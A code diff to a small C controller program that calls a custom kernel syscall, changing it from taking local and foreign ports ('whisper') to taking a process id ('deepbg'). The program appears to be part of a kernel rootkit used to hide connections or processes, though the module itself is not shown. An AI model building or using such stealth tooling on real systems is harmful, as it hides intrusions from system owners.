@@ -4,25 +4,25 @@
 #include <sys/module.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <sys/proc.h>
 #include "shadow_sysent.h"
 
 int main(int argc, char **argv) {
 
    int syscall_num = 0;
-   u_int16_t lport, fport = 0;
+   pid_t pid = 0;
 
-   if (argc < 4) {
-      printf("Usage: %s <syscall number> <local port> <foreign port>\n",
+   if (argc < 3) {
+      printf("Usage: %s <syscall number> <pid>\n",
          argv[0]);
       return -1;
    } else {
       syscall_num = atoi(argv[1]);
-      lport = atoi(argv[2]);
-      fport = atoi(argv[3]);
+      pid = atoi(argv[2]);
    }
 
-   if (syscall(syscall_num, lport, fport) != 0) {
-      printf("[x] whisper syscall %d failed. Is module loaded?\n", syscall_num);
+   if (syscall(syscall_num, pid) != 0) {
+      printf("[x] deepbg syscall %d failed. Is module loaded?\n", syscall_num);
       return -2;
    }
 
